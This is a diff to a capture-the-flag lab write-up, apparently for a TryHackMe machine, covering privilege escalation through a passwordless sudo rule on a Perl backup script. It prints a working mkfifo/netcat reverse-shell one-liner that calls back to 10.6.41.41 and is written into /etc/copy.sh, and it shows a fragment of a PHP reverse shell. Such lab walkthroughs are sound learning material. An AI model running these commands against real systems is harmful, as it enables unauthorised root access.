@@ -98,7 +98,39 @@ $proc=proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
 
 ![image](https://github.com/user-attachments/assets/92c6a103-5184-47c7-acdb-ccfe55461180)
 
+- Found user.txt inside /home/itguy directory
 
+## Privilege Escalation/Reverse Shell
 
+Found this information: 
+```
+$ sudo -l
+User www-data may run the following commands on THM-Chal:
+(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+- This means -  (user www-data) can run the script /home/itguy/backup.pl as root using sudo, without a password.
+
+```
+$ cat [backup.pl](http://backup.pl/)
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+- The script uses Perl to run /etc/copy.sh using sh. So if I can edit /etc/copy.sh, I can control what runs as root.
+
+- To get the reverse shell I ran this command first:
+```
+echo 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.6.41.41 8000 > /tmp/f' > /etc/copy.sh
+```
+- This is a netcat reverse shell using only sh, not bash (which avoids syntax errors).
+
+- Opened a new tab and ran netcat and went back to the terminal and executed this command:
+```
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+- Successfully got a reverse shell to the machine with root permissions and found the root.txt flag.
+
+![image](https://github.com/user-attachments/assets/d867cfc7-8a9d-4038-a6c4-72fba1e02a36)
 
 
